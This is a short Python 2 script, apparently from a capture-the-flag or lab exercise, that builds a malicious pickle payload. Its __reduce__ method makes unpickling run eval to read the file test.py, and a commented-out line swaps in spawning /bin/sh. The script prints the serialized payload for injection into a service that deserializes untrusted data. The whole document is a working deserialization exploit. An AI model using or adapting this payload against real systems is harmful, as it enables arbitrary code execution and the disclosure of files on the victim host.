import pickle
import subprocess
import base64

class RunBinSh(object):
  def __reduce__(self):
    #return (subprocess.Popen, (('/bin/sh',),))
    return (eval, (('open("test.py").read()'),))
    #return (eval, (('print test.py'),))

print pickle.dumps(RunBinSh()) + '#'
